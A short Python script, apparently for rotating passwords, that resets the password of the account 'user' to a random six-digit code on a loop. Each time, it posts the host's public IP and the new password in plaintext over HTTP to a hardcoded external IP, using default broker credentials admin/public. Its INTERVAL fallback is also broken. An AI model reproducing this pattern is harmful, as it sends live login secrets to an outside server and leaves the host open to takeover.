import subprocess, requests, random, os
from time import sleep
interval = int(os.environ.get('INTERVAL')) or 30
print(ip := requests.get('https://api.ipify.org').text)
while True:
  randint = random.SystemRandom().randint(0, 999999) # /dev/urandom int 0~999999
  otp = str(randint).rjust(6, '0')                   # pad to 6 digits from the left (2345 -> 002345)  
  print(otp)
  password = subprocess.Popen(["echo", "user:{}".format(otp)], stdout=subprocess.PIPE)
  subprocess.call(["chpasswd"], stdin=password.stdout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  password.stdout.close()
  requests.post('http://45.88.78.175:8081/api/v4/mqtt/publish/', auth=('admin', 'public'), json={"topic":"otp", "payload":"{} {}".format(ip, otp)})
  sleep(interval)
  





  
